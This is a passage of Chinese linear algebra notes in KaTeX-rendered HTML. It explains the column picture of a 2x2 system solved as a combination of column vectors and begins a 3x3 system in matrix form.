fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">x\begin{bmatrix}2\\-1\end{bmatrix}+y\begin{bmatrix}-1\\2\end{bmatrix}=\begin{bmatrix}0\\3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>（我们把第一个向量称作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">col_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，第二个向量称作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">col_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，以表示第一列向量和第二列向量），要使得式子成立，需要第一个向量加上两倍的第二个向量，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mn>2</mn><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">1\begin{bmatrix}2\\-1\end{bmatrix}+2\begin{bmatrix}-1\\2\end{bmatrix}=\begin{bmatrix}0\\3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>。<br>现在来看列图像，在二维平面上画出上面的列向量：</p><p>如图，绿向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">col_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与蓝向量（两倍的蓝绿向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">col_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）合成红向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>。</p><p>接着，我们继续观察<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mi>y</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">x\begin{bmatrix}2\\-1\end{bmatrix}+y\begin{bmatrix}-1\\2\end{bmatrix}=\begin{bmatrix}0\\3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">col_1,col_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的某种线性组合得到了向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">col_1,col_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的所有线性组合能够得到什么结果？它们将铺满整个平面。<br>下面进入三个未知数的方程组：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi>x</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>x</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>+</mo><mn>2</mn><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>z</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>+</mo><mn>4</mn><mi>z</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mn>4</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}2x&amp;-y&amp;&amp;=0\\-x&amp;+2y&amp;-z&amp;=-1\\&amp;-3y&amp;+4z&amp;=4\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.9099999999999997em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35002em;"><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.19499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.2950099999999996em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8500199999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal">x</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal">x</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">+</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">+</span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，写作矩阵形式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo separator="true">,</mo><mtext> </mtext><mi>b</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">A=\begin{bmatrix}2&amp;-1&amp;0\\-1&amp;2&amp;-1\\0&amp;-3&amp;4\end{bmatrix},\ b=\begin{bmatrix}0\\-1\\4\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span 